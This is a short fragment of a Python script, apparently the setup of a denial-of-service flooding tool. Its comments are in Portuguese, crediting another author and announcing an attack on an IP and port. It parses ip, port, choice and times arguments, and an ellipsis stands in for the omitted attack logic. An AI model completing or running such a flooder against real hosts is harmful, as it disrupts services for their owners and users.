#!/usr/bin/env python3
#esse codigo não foi meu apenas melhores o script. creditos : LeeOn123
import argparse
import random
import socket
import threading
...
print("-->  down! <--")
print("#-- ataque iniciado a ip e porta --#")
ip = args['ip']
port = args['port']
choice = args['choice']
times = args['times']
